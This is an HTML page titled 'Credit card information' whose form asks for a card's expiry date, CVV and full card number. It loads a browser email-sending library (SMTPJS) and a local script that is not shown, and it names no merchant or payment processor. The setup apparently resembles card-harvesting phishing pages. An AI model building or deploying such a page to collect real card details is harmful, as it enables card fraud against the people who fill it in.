<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="./style.css" />
  <link rel="icon" href="./src/imgNosotros/ico.png" type="png">  
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@700&family=Handlee&family=Lato:wght@300&display=swap"rel="stylesheet" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.4/font/bootstrap-icons.css">
   
    <title>Credit card information</title>
</head>

<body>
  

  <div class="container">
    <div class="row">
      <div class="col-md">
        <h1 class="titleCard">Credit card</h1>
        <h2 class="text1">
          Please insert your information.
        </h2>
        <p id="alertValidateText"></p>
      </div>
    </div>
    <div class="row">
      <div class="col-md-10 mx-auto">
        <form class="login-box">
          <div id="Error"></div>
          <div class="user-box">
            <input type="text" name="" required="" id="DateExpiry" />
            <label>Date of Expiry</label>
          </div>
          <div class="user-box">
            <input type="text" name="" required="" id="cvv" />
            <label>CVV</label>
          <div class="user-box">
              <input type="text" name="" required="" id="pan" />
              <label>PAN</label>
            </div>
            <br /><br />
          </div>
          <div class="mb-3 form-check"></div>
          
          <div class="btn">
            <a href="#" id="btnSend">
             Send
            </a>
          </div>
        </form>
      </div>
    </div>
  </div>
  </div>
  <script src="./main.js"></script>
  <script src="https://smtpjs.com/v3/smtp.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
    crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</body>


</html>
